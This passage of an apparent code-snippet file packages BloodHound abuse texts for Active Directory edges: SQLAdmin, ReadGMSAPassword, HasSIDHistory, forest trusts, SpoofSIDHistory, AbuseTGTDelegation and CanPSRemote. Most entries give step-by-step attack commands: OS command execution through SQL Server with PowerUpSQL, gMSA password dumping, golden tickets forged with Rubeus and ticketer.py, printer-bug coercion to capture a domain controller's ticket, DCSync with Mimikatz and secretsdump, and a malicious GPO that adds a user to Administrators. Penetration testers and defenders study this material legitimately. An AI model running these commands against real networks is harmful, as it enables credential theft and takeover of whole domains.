            "The user $CONTROLLED is a SQL admin on the computer $TARGET.There is at least one MSSQL instance running on $TARGET where the user $CONTROLLED is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of \"MSSQLSvc\" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.Author: Scott Sutherland",
            "To Abuse 'SQLAdmin' commonly: ",
            "Scott Sutherland ([@nullbind](https://twitter.com/_nullbind)) from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber ([@egru](https://twitter.com/egru)), and Thomas Elling ([@thomaselling](https://github.com/thomaselling)). Before executing any of the below commands, download PowerUpSQL and load it into your PowerShell instance. Get PowerUpSQL here: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL).",
            "Finding Data",
            "Get a list of databases, sizes, and encryption status:",
            "```sh",
            "Get-SQLDatabaseThreaded \u2013Verbose -Instance sqlserver\\instance \u2013Threads 10 -NoDefaults",
            "```",
            "Search columns and data for keywords:",
            "```sh",
            "Get-SQLColumnSampleDataThreaded \u2013Verbose -Instance sqlserver\\instance \u2013Threads 10 \u2013Keyword \"card, password\" \u2013SampleSize 2 \u2013ValidateCC -NoDefaults | ft -AutoSize",
            "```",
            "Executing Commands",
            "Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges.",
            "xp_cmdshell Execute Example:",
            "```sh",
            "Invoke-SQLOSCmd -Verbose -Command \"Whoami\" -Threads 10 -Instance sqlserver\\instance",
            "```",
            "Agent Job Execution Examples:",
            "```sh",
            "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command \"echo hello > c:\\windows\\temp\\test1.txt\" -Instance sqlserver\\instance -username myuser -password mypassword",
            "```",
            "```sh",
            "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output \"hello world\" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword",
            "```",
            "```sh",
            "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword",
            "```",
            "```sh",
            "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword",
            "```",
            "Python Subsystem Execution:",
            "```sh",
            "Invoke-SQLOSPython -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
            "```",
            "R subsystem Execution Example",
            "```sh",
            "Invoke-SQLOSR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
            "```",
            "OLE Execution Example",
            "```sh",
            "Invoke-SQLOSOle -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
            "```",
            "CLR Execution Example",
            "```sh",
            "Invoke-SQLOSCLR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
            "```",
            "Custom Extended Procedure Execution Example:",
            "1. Create a custom extended stored procedure.",
            "```sh",
            "Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command \"echo test > c:\\temp\\test.txt\" -ExportName xp_test",
            "```",
            "2. Host the test.dll on a share readable by the SQL Server service account.",
            "```sh",
            "Get-SQLQuery -Verbose -Query \"sp_addextendedproc 'xp_test', '\\\\yourserver\\yourshare\\myxp.dll'\" -Instance sqlserver\\instance",
            "```",
            "3. Run extended stored procedure",
            "```sh",
            "Get-SQLQuery -Verbose -Query \"xp_test\" -Instance sqlserver\\instance",
            "```",
            "4. Remove extended stored procedure.",
            "```sh",
            "Get-SQLQuery -Verbose -Query \"sp_dropextendedproc 'xp_test'\" -Instance sqlserver\\instance",
            "```",
            "Author: Scott Sutherland"
        ]
    },
    "ReadGMSAPassword linux abuse (bloodhound)": {
        "description": "target object is a Group Managed Service Account. The  controlled object can retrieve the password for the GMSA target object.Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.",
        "prefix": "ReadGMSAPassword",
        "body": [
            "$TARGET is a Group Managed Service Account. The  $CONTROLLED can retrieve the password for the GMSA $TARGET.Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.",
            "To Abuse 'ReadGMSAPassword' on linux: ",
            "There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process.",
            "If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the \"HasSession\" help modal for more details).",
            "Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.[gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) can be used for that purpose.",
            "```sh",
            "gMSADumper.py -u 'user' -p 'password' -d 'domain.local'",
            "```",
            "At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."
        ]
    },
    "HasSIDHistory common abuse (bloodhound)": {
        "description": "The  controlled object has, in its SIDHistory attribute, the SID for the  target object.When a kerberos ticket is created for controlled object, it will include the SID for target object, and therefore grantcontrolled object the same privileges and permissions astarget object.",
        "prefix": "HasSIDHistory",
        "body": [
            "The  $CONTROLLED has, in its SIDHistory attribute, the SID for the  $TARGET.When a kerberos ticket is created for $CONTROLLED, it will include the SID for $TARGET, and therefore grant$CONTROLLED the same privileges and permissions as$TARGET.",
            "To Abuse 'HasSIDHistory' commonly: ",
            "No special actions are needed to abuse this, as the kerberos tickets created will have all SIDs in the object's SID history attribute added to them; however, if traversing a domain trust boundary, ensure that SID filtering is not enforced, as SID filtering will ignore any SIDs in the SID history portion of a kerberos ticket.",
            "By default, SID filtering is not enabled for all domain trust types."
        ]
    },
    "CrossForestTrust common abuse (bloodhound)": {
        "description": "The CrossForestTrust edge represents a cross-forest (interforest) trust relationship between two domains/forests. In this relationship, the controlled object domain has a cross-forest trust to the target object domain, allowing principals (users and computers) from target object to access resources in controlled object.Trust Edge PropertiesBloodHound stores the following properties for CrossForestTrust edges (listed under Relationship Information):- Spoof SID History Blocked\nAn attacker with control over the trusted domain may attempt to escalate privileges in the trusting domain using a spoof SID history attack by injecting the SID of a privileged principal from the trusting domain into their authentication request. However, this attack can be prevented by SID filtering.SID filtering removes domain SIDs from authentication requests of foreign principals based on the trust configuration. Built-in SIDs (S-1-5-32-*) are always filtered, regardless of the configuration. For cross-forest trusts, blocking spoof SID history attacks requires filtering out SIDs that do not belong to the forest of the trusted domain.Cross-forest trusts blocks spoof SID history attacks by default. Forest trusts filter out SIDs that do not belong to the forest of the trusted domain. However, SID filtering for forest trusts can be relaxed by enabling the trustAttributes flag TREAT_AS_EXTERNAL. When enabled, SID filtering behaves like it does for external trusts (without quarantine mode), meaning only SIDs with a RID below 1000 (built-in AD principals) are filtered, allowing a potential spoof SID history attack.External trusts have quarantine mode (trustAttributes flag QUARANTINED_DOMAIN) enabled by default, protecting the trusting domain by filtering out SIDs that do not belong to the trusted domain in authentication requests. An external trust with quarantine mode disabled does not block spoof SID history attacks.SID filtering is managed from the outbound side of the trust. As a result, this property is only created if trust data from the outbound side has been ingested.- TGT Delegation\nTGT delegation determines whether unconstrained delegation is allowed over the trust. When a principal from the trusted domain authenticates against a Kerberos resource with unconstrained delegation in the trusting domain, their Kerberos TGT (Ticket Granting Ticket) is forwarded to the resource as part of Kerberos authentication, but only if TGT delegation is enabled (true).By default, TGT delegation is disabled for cross-forest trusts. It is enabled if the trustAttributes flag CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION is enabled for the trust and quarantine mode (trustAttributes flag QUARANTINED_DOMAIN) is NOT enabled.TGT delegation is controlled from the inbound side of the trust, and the property is therefore only created if trust data from this side has been ingested.- Transitive\nTransitivity defines whether the trust extends beyond the two domains involved. A transitive trust allows access not only to principals of the trusted domain but also to those from other domains trusted by the trusted domain.Forest trusts are always transitive, external trusts are non-transitive.Attackers can bypass the limitations of non-transitive trusts by manually requesting local Kerberos TGTs for each domain in the trust chain. They can then use these local TGTs to access Kerberos resources that would otherwise be denied if requested directly. For more details, refer to \"External trusts are evil\" under References.- Trust Attributes\nThis property stores the raw value of the trustAttributes LDAP attribute, which defines the trust's configuration settings. BloodHound retains this property from both the outbound and inbound sides of the trust, as they may differ.- Trust Type\nThe trust type for cross-forest trusts can be Forest, External, Kerberos (Realm), or Unknown. Refer to the \"Microsoft AD Trust Technical Documentation\" under References for more details.",
        "prefix": "CrossForestTrust",
        "body": [
            "The CrossForestTrust edge represents a cross-forest (interforest) trust relationship between two domains/forests. In this relationship, the $CONTROLLED domain has a cross-forest trust to the $TARGET domain, allowing principals (users and computers) from $TARGET to access resources in $CONTROLLED.Trust Edge PropertiesBloodHound stores the following properties for CrossForestTrust edges (listed under Relationship Information):- Spoof SID History Blocked\nAn attacker with control over the trusted domain may attempt to escalate privileges in the trusting domain using a spoof SID history attack by injecting the SID of a privileged principal from the trusting domain into their authentication request. However, this attack can be prevented by SID filtering.SID filtering removes domain SIDs from authentication requests of foreign principals based on the trust configuration. Built-in SIDs (S-1-5-32-*) are always filtered, regardless of the configuration. For cross-forest trusts, blocking spoof SID history attacks requires filtering out SIDs that do not belong to the forest of the trusted domain.Cross-forest trusts blocks spoof SID history attacks by default. Forest trusts filter out SIDs that do not belong to the forest of the trusted domain. However, SID filtering for forest trusts can be relaxed by enabling the trustAttributes flag TREAT_AS_EXTERNAL. When enabled, SID filtering behaves like it does for external trusts (without quarantine mode), meaning only SIDs with a RID below 1000 (built-in AD principals) are filtered, allowing a potential spoof SID history attack.External trusts have quarantine mode (trustAttributes flag QUARANTINED_DOMAIN) enabled by default, protecting the trusting domain by filtering out SIDs that do not belong to the trusted domain in authentication requests. An external trust with quarantine mode disabled does not block spoof SID history attacks.SID filtering is managed from the outbound side of the trust. As a result, this property is only created if trust data from the outbound side has been ingested.- TGT Delegation\nTGT delegation determines whether unconstrained delegation is allowed over the trust. When a principal from the trusted domain authenticates against a Kerberos resource with unconstrained delegation in the trusting domain, their Kerberos TGT (Ticket Granting Ticket) is forwarded to the resource as part of Kerberos authentication, but only if TGT delegation is enabled (true).By default, TGT delegation is disabled for cross-forest trusts. It is enabled if the trustAttributes flag CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION is enabled for the trust and quarantine mode (trustAttributes flag QUARANTINED_DOMAIN) is NOT enabled.TGT delegation is controlled from the inbound side of the trust, and the property is therefore only created if trust data from this side has been ingested.- Transitive\nTransitivity defines whether the trust extends beyond the two domains involved. A transitive trust allows access not only to principals of the trusted domain but also to those from other domains trusted by the trusted domain.Forest trusts are always transitive, external trusts are non-transitive.Attackers can bypass the limitations of non-transitive trusts by manually requesting local Kerberos TGTs for each domain in the trust chain. They can then use these local TGTs to access Kerberos resources that would otherwise be denied if requested directly. For more details, refer to \"External trusts are evil\" under References.- Trust Attributes\nThis property stores the raw value of the trustAttributes LDAP attribute, which defines the trust's configuration settings. BloodHound retains this property from both the outbound and inbound sides of the trust, as they may differ.- Trust Type\nThe trust type for cross-forest trusts can be Forest, External, Kerberos (Realm), or Unknown. Refer to the \"Microsoft AD Trust Technical Documentation\" under References for more details.",
            "To Abuse 'CrossForestTrust' commonly: ",
            "The cross-forest trust does not enable a compromise of any of the domains by default.",
            "BloodHound creates separate traversable edges between the domains if the configuration of the trust enables abuse."
        ]
    },
    "SameForestTrust common abuse (bloodhound)": {
        "description": "The SameForestTrust edge represents a same-forest (intraforest) trust relationship between two domains within the same AD forest. In this relationship, the controlled object domain has a same-forest trust with the target object domain, allowing principals (users and computers) from target object to access resources in controlled object.Since both domains belong to the same forest, they inherently trust each other, granting implicit access to resources across domains. It also means compromising one of the domains enable compromise of the other.Trust Edge PropertiesBloodHound stores the following properties for SameForestTrust edges (listed under Relationship Information):- Spoof SID History Blocked\nAn attacker with control over the trusted domain may attempt to escalate privileges in the trusting domain using a spoof SID history attack by injecting the SID of a privileged principal from the trusting domain into their authentication request. However, this attack can be prevented by SID filtering.SID filtering removes domain SIDs from authentication requests of foreign principals based on the trust configuration. Built-in SIDs (S-1-5-32-*) are always filtered, regardless of the configuration. SID filtering blocks the spoof SID history attack over same-forest trusts when the trust is configured in quarantine mode (trustAttributes flag QUARANTINED_DOMAIN enabled), which filters out SIDs that do not belong to the trusted domain. Same-forest trusts does not have quarantine mode enabled by default.SID filtering is managed from the outbound side of the trust, and the \"Spoof SID History Blocked\" property is therefore only created if trust data from this side has been ingested.- TGT Delegation\nTGT delegation determines whether unconstrained delegation is allowed over the trust. When a principal from the trusted domain authenticates against a Kerberos resource with unconstrained delegation in the trusting domain, their Kerberos TGT (Ticket Granting Ticket) is forwarded to the resource as part of Kerberos authentication, but only if TGT delegation is enabled (true).By default, TGT delegation is enabled for same-forest trusts. It is disabled if quarantine mode (trustAttributes flag QUARANTINED_DOMAIN) is enabled.TGT delegation is controlled from the inbound side of the trust, and the property is therefore only created if trust data from this side has been ingested.- Transitive\nTransitivity defines whether the trust extends beyond the two domains involved. A transitive trust allows access not only to principals of the trusted domain but also to those from other domains trusted by the trusted domain.\n\nSame-forest trusts are always transitive.- Trust Attributes\nThis property stores the raw value of the trustAttributes LDAP attribute, which defines the trust's configuration settings. BloodHound retains this property from both the outbound and inbound sides of the trust, as they may differ.- Trust Type\nThe trust type for same-forest trusts can be TreeRoot, ParentChild, or CrossLink (Shortcut). Refer to the \"Microsoft AD Trust Technical Documentation\" under References for more details.",
        "prefix": "SameForestTrust",
        "body": [
            "The SameForestTrust edge represents a same-forest (intraforest) trust relationship between two domains within the same AD forest. In this relationship, the $CONTROLLED domain has a same-forest trust with the $TARGET domain, allowing principals (users and computers) from $TARGET to access resources in $CONTROLLED.Since both domains belong to the same forest, they inherently trust each other, granting implicit access to resources across domains. It also means compromising one of the domains enable compromise of the other.Trust Edge PropertiesBloodHound stores the following properties for SameForestTrust edges (listed under Relationship Information):- Spoof SID History Blocked\nAn attacker with control over the trusted domain may attempt to escalate privileges in the trusting domain using a spoof SID history attack by injecting the SID of a privileged principal from the trusting domain into their authentication request. However, this attack can be prevented by SID filtering.SID filtering removes domain SIDs from authentication requests of foreign principals based on the trust configuration. Built-in SIDs (S-1-5-32-*) are always filtered, regardless of the configuration. SID filtering blocks the spoof SID history attack over same-forest trusts when the trust is configured in quarantine mode (trustAttributes flag QUARANTINED_DOMAIN enabled), which filters out SIDs that do not belong to the trusted domain. Same-forest trusts does not have quarantine mode enabled by default.SID filtering is managed from the outbound side of the trust, and the \"Spoof SID History Blocked\" property is therefore only created if trust data from this side has been ingested.- TGT Delegation\nTGT delegation determines whether unconstrained delegation is allowed over the trust. When a principal from the trusted domain authenticates against a Kerberos resource with unconstrained delegation in the trusting domain, their Kerberos TGT (Ticket Granting Ticket) is forwarded to the resource as part of Kerberos authentication, but only if TGT delegation is enabled (true).By default, TGT delegation is enabled for same-forest trusts. It is disabled if quarantine mode (trustAttributes flag QUARANTINED_DOMAIN) is enabled.TGT delegation is controlled from the inbound side of the trust, and the property is therefore only created if trust data from this side has been ingested.- Transitive\nTransitivity defines whether the trust extends beyond the two domains involved. A transitive trust allows access not only to principals of the trusted domain but also to those from other domains trusted by the trusted domain.\n\nSame-forest trusts are always transitive.- Trust Attributes\nThis property stores the raw value of the trustAttributes LDAP attribute, which defines the trust's configuration settings. BloodHound retains this property from both the outbound and inbound sides of the trust, as they may differ.- Trust Type\nThe trust type for same-forest trusts can be TreeRoot, ParentChild, or CrossLink (Shortcut). Refer to the \"Microsoft AD Trust Technical Documentation\" under References for more details.",
            "To Abuse 'SameForestTrust' commonly: ",
            "An attacker with control over any domain within the forest can escalate their privileges to compromise other domains using multiple techniques.",
            "Spoof SID history",
            "An attacker can spoof the SID history of a principal in the target domain, tricking the target domain into treating the attacker as that privileged principal.",
            "Refer to the SpoofSIDHistory edge documentation under References for more details. The edge describes an attack over a cross-forest trust, but the principles remain the same.",
            "This attack fails if quarantine mode is enabled (Spoof SID History Blocked = True) on the trust relationship in the opposite direction of the attack. The SID filtering removes SIDs belonging to any other domain than the attacker-controlled domain from the authentication request. However, enabling quarantine is rare and generally not recommended for same-forest trusts.",
            "Abuse TGT delegation",
            "An attacker can coerce a privileged computer (e.g., a domain controller (DC)) in the target domain to authenticate to an attacker-controlled computer configured with unconstrained delegation. This provides the attacker with a Kerberos TGT for the coerced computer.",
            "Refer to the AbuseTGTDelegation edge documentation under References for more details. The edge describes an attack over a cross-forest trust, but the principles remain the same.",
            "This attack fails if quarantine mode is enabled on the trust relationship in the opposite direction of the attack. This prevents TGTs from being sent across the trust. However, enabling quarantine is rare and generally not recommended for same-forest trusts.",
            "ADCS ESC5",
            "The Configuration Naming Context (NC) is a forest-wide partition writable by any DC within the forest. Most Active Directory Certificate Services (ADCS) configurations are stored in the Configuration NC. An attacker can abuse a DC to modify ADCS configurations to enable an ADCS domain escalation opportunity that compromises the entire forest.",
            "Attack steps:Obtain a SYSTEM session on a DC in the attacker-controlled domainCreate a certificate template allowing ESC1 abusePublish the certificate template to an enterprise CAEnroll the certificate as a privileged user in the target domainAuthenticate as the privileged user in the target domain using the certificate",
            "Refer to \"From DA to EA with ESC5\" under References for more details.",
            "If ADCS is not installed: An attacker can simply install ADCS in the environment and exploit it, as detailed in the reference \"Escalating from child domain\u2019s admins to enterprise admins in 5 minutes by abusing AD CS, a follow up\".",
            "GPO linked on Site",
            "AD sites are stored in the forest-wide Configuration NC partition, writable by any DC within the forest. An attacker with SYSTEM access to a DC can link a malicious GPO to the site of any DC in the forest.",
            "- Step 1: Obtain a SYSTEM session on a DC in the attacker-controlled domain",
            "Use PsExec to start a PowerShell terminal as SYSTEM on the DC:",
            "```sh",
            "PsExec64.exe -s -i -accepteula powershell",
            "```",
            "- Step 2: Create a GPO",
            "Use the GroupPolicy module of RSAT to create the new GPO:",
            "```sh",
            "New-GPO -Name \"MyGPO\"",
            "```",
            "- Step 3: Add the compromising setting to the GPO",
            "Use SharpGPOAbuse to add a scheduled task that adds a compromised user to the Administrators group:",
            "```sh",
            ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"MyTask\" --Author \"NT AUTHORITY\\SYSTEM\" --Command \"cmd.exe\" --Arguments \"/c net localgroup Administrators /Add DUMPSTER\\tim\" --GPOName \"MyGPO\"",
            "```",
            "- Step 4: Identify a target DC and it's site",
            "Use the ActiveDirectory module of RSAT to query for DCs in the target domain:",
            "```sh",
            "Get-ADDomainController -server bastion.local | select Name,Site",
            "```",
            "Look up the site DistinguishedName:",
            "```sh",
            "Get-ADReplicationSite Default-First-Site-Name | select DistinguishedName",
            "```",
            "- Step 5: Set the GPO permissions",
            "This step is important to avoid applying the GPO to all computers connected to the site. Use the GroupPolicy module of RSAT to modify the permissions such that Authenticated Users can read the object but only the targeted computer applies the GPO settings:",
            "```sh",
            "$$GPO = Get-GPO -Name \"MyGPO\"",
            "$$GPO | Set-GPPermissions -PermissionLevel GpoRead -TargetName \"Authenticated Users\" -TargetType Group -Replace",
            "$$GPO | Set-GPPermissions -PermissionLevel GpoApply -TargetName \"BASTION\\bldc01\" -TargetType Computer",
            "```",
            "- Step 6: Link the GPO to the site",
            "Use the GroupPolicy module of RSAT to link the GPO to the site:",
            "```sh",
            "New-GPLink -Name \"MyGPO\" -Target \"CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=bastion,DC=local\" -Server dc01.dumpster.fire",
            "```",
            "Note that you must specify the server to be the DC where you are running the command, as the command defaults to execute the change on a root domain DC where the compromised DC does not have the permissions to link the GPO.",
            "Wait until replication has happened and the GPO has applied on the target DC, and log in with Administrators access on the compromised DC. Replication within the same site happens within 15 seconds but runs on 3 hour schedule by default across sites. GPOs are applied on a 90-120 min interval by default."
        ]
    },
    "SpoofSIDHistory common abuse (bloodhound)": {
        "description": "The cross-forest trust from target object to controlled object has a weak SID filtering configuration (Spoof SID History Blocked = False).The target object domain allows principals of controlled object access by SIDs of target object in their SID history. An attacker with control over the controlled object domain can craft access requests with manipulated SID history containing SIDs of privileged principals of target object to gain control over the target object domain.",
        "prefix": "SpoofSIDHistory",
        "body": [
            "The cross-forest trust from $TARGET to $CONTROLLED has a weak SID filtering configuration (Spoof SID History Blocked = False).The $TARGET domain allows principals of $CONTROLLED access by SIDs of $TARGET in their SID history. An attacker with control over the $CONTROLLED domain can craft access requests with manipulated SID history containing SIDs of privileged principals of $TARGET to gain control over the $TARGET domain.",
            "To Abuse 'SpoofSIDHistory' commonly: ",
            "When spoofing SID history over a same-forest trust, any domain SID from the target domain can be used. The most common choice is the Enterprise Admins SID, as it grants full control over the target domain.",
            "Spoofing SID history over a cross-forest trust is more restricted. In this scenario, SID filtering removes SIDs with a RID below 1000, meaning built-in AD groups like Domain Admins and Enterprise Admins cannot be used. Additionally, group memberships for global and universal groups are not applied based on SID history, making accounts in groups like Domain Admins and Enterprise Admins ineffective as targets.The attack target must be a user, computer, or a non-builtin group with permissions granted directly or through built-in/domain local groups (NOT through membership of global/universal groups).Common viable targets with indirect full control over the environment include:The Exchange Windows Permissions groupEntra ID sync (MSOL_) accountsCustom groups with administrative control over Tier Zero assets",
            "Alternatively, an attacker can target a domain controller (DC) and use resource-based constrained delegation (RBCD) to obtain a local TGT as the DC, which can then be used for a DCSync attack on the target domain. However, the RBCD attack requires control over an account (user or computer) in the target forest. If no such account is available and the default permissions for creating computers have not been restricted, the attacker can first spoof SID history against a target with permissions to create computer accounts, to then perform the RBCD attack against a DC.",
            "The spoofed SID can be added to SID history at three different levels for the attacker-controlled user of the trusted domain:In the user's SID History AD attributeIn the user's Kerberos TGTIn the user's Kerberos inter-realm TGTThe first option enables the attack over both Kerberos and NTLM, whereas the latter two only apply to Kerberos authentication. However, modifying the SID History attribute is risky\u2014it cannot be edited directly via LDAP or built-in AD tools. Mimikatz supports modifying it with the command sid::patch followed by sid::add, but sid::patch does not work on Windows Server 2016 and later. It is possible to modify the SID History attribute using the DSInternals command Add-ADDBSidHistory, but this requires stopping and restarting the NTDS service, which is not recommended in a production environment.The second and third options are safer. The following example demonstrates the second option.",
            "Step 1) Obtain krbtgt Credentials",
            "The krbtgt credentials can be obtained in multiple ways with administrative access to a DC in the trusted domain, such as via a DCSync attack.",
            "Step 2) Forge and Inject a Golden Ticket",
            "Generate a Golden Ticket (Kerberos TGT) in the trusted domain with the target's SID added in SID history. Alternatively, a Diamond Ticket can be created for better OPSEC.",
            "On Windows, use Rubeus:",
            "```sh",
            "Rubeus.exe golden /aes256:<krbtgt AES256 secret key> /user:<trusted domain user SAMAccountName> /id:<trusted domain user RID> /domain:<trusted domain DNSname> /sid:<trusted domain SID> /sids:<target SID> /dc:<trusted domain DC DNSname> /nowrap /ptt",
            "```",
            "This command injects the ticket into memory, allowing access to the target domain with the permissions of the target.",
            "On Linux, use ticketer.py from Impacket:",
            "```sh",
            "ticketer.py -nthash <krbtgt NT hash> -aesKey <krbtgt AES256 secret key> -domain-sid <trusted domain SID> -domain <trusted domain DNSname> -extra-sid <target SID> <trusted domain user SAMAccountName>",
            "```",
            "The ticketer.py command saves the Golden Ticket as a .ccache file. To use it with tools supporting Kerberos authentication, set the KRB5CCNAME environment variable:",
            "```sh",
            "export KRB5CCNAME=$$path_to_ticket.ccache",
            "```"
        ]
    },
    "AbuseTGTDelegation common abuse (bloodhound)": {
        "description": "The cross-forest trust from target object to controlled object has TGT delegation enabled.When a resource in controlled object is configured with unconstrained delegation, principals from target object will automatically forward their Ticket Granting Ticket (TGT) to that resource upon access.",
        "prefix": "AbuseTGTDelegation",
        "body": [
            "The cross-forest trust from $TARGET to $CONTROLLED has TGT delegation enabled.When a resource in $CONTROLLED is configured with unconstrained delegation, principals from $TARGET will automatically forward their Ticket Granting Ticket (TGT) to that resource upon access.",
            "To Abuse 'AbuseTGTDelegation' commonly: ",
            "TGT delegation allows an attacker to capture TGTs of privileged users or computers in the target domain when they authenticate against a system configured with unconstrained delegation.",
            "A common attack method involves the attacker logging into a DC of the source domain and coercing a DC of the target domain. Since DCs have unconstrained delegation enabled by default, this grants the attacker a TGT for a target domain DC, which can then be used to perform a DCSync attack on the target domain. This guide details that version of the attack.",
            "Alternatively, attackers can target other privileged computers or users besides DCs.",
            "The attack will fail if the target is a member of Protected Users or is marked as not trusted for delegation, as their TGTs will not be sent to hosts with unconstrained delegation. You can identify all protected principals using the following Cypher query in BloodHound:",
            "MATCH (g:Group)",
            "WHERE g.objectid ENDS WITH \"-525\"",
            "MATCH (n:Base)",
            "WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)",
            "RETURN n",
            "LIMIT 1000",
            "Attackers can also exploit non-DC hosts or users in the source domain with unconstrained delegation enabled. To find all non-DC principals with unconstrained delegation in BloodHound, run:",
            "MATCH (n:Base)",
            "WHERE n.unconstraineddelegation = TRUE AND NOT (n)-[:DCFor]->()",
            "RETURN n",
            "Step 1: Start Monitoring for TGTs",
            "- Windows:",
            "Log into a DC of the source domain and open a command prompt as Administrator.",
            "Start monitoring for incoming TGTs using Rubeus:",
            "```sh",
            "Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap",
            "```",
            "- Linux:",
            "Obtain credentials for a computer or user with unconstrained delegation.",
            "Start monitoring for incoming TGTs using krbrelayx.py with the credentials of the unconstrained delegation account:",
            "```sh",
            "krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab",
            "```",
            "Step 2: Coerce the Target DC",
            "The printer bug is abused in this example. If the Print Spooler service is disabled on the target host, alternative coercion techniques must be used. See \"Windows Coerced Authentication Methods\" under References for details.",
            "To coerce the target DC, Authenticated Users access is required in the target domain. If the trust relationship is bidirectional, all principals in the source domain have this access by default. If not, coercion must be executed as a principal from the target forest. Attackers can obtain such a session using the trust account attack. See \"SID Filter as a Security Boundary Between Domains? (Part 7) - Trust Account Attack\" under References for details.",
            "- Windows:",
            "From any host in the domain, coerce the target DC using SpoolSample:",
            "```sh",
            "SpoolSample.exe targetdc.domain.local compromiseddc.otherdomain.local",
            "```",
            "Rubeus will print the DC TGT as soon as it is received.",
            "- Linux:",
            "Coerce the target DC using printerbug.py:",
            "```sh",
            "printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised DC IP>",
            "```",
            "krbrelayx.py will save the received TGT to disk.",
            "Step 3: Pass the Ticket",
            "- Windows:",
            "Inject the DC TGT into memory using Rubeus:",
            "```sh",
            "Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...",
            "```",
            "- Linux:",
            "Set the KRB5CCNAME environment variable to the ticket's path:",
            "```sh",
            "export KRB5CCNAME=$$path_to_ticket.ccache",
            "```",
            "Step 4: DCSync the Target Domain",
            "- Windows:",
            "Use Mimikatz to DCSync the target domain from the machine where the DC TGT was injected:",
            "```sh",
            "lsadump::dcsync /domain:domain.local /user:DOMAIN\\Administrator",
            "```",
            "- Linux:",
            "Use secretsdump.py to DCSync the target domain:",
            "```sh",
            "secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>",
            "```"
        ]
    },
    "CanPSRemote common abuse (bloodhound)": {
        "description": "This entity has the capability to create a PSRemote Connection with the computer target object.PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.Note: This edge does not guarantee privileged execution.",
        "prefix": "CanPSRemote",
        "body": [
            "This entity has the capability to create a PSRemote Connection with the computer $TARGET.PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.Note: This edge does not guarantee privileged execution.",
            "To Abuse 'CanPSRemote' commonly: ",
            "Abuse of this privilege will require you to have interactive access with a system on the network.",
            "A remote session can be opened using the New-PSSession powershell command.",
            "You may need to authenticate to the Domain Controller as a member of $$CONTROLLED if you are not running a process as a member. To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):",
            "```sh",
            "$$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
            "$$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $$SecPassword)",
            "```",
            "Then use the New-PSSession command with the credential we just created:",
            "```sh",
            "$$session = New-PSSession -ComputerName $$TARGET -Credential $$Cred",
            "```",
            "This will open a powershell session on $$TARGET.",
            "You can then run a command on the system using the Invoke-Command cmdlet and the session you just created",
            "```sh",
            "Invoke-Command -Session $$session -ScriptBlock {Start-Process cmd}",
            "```",
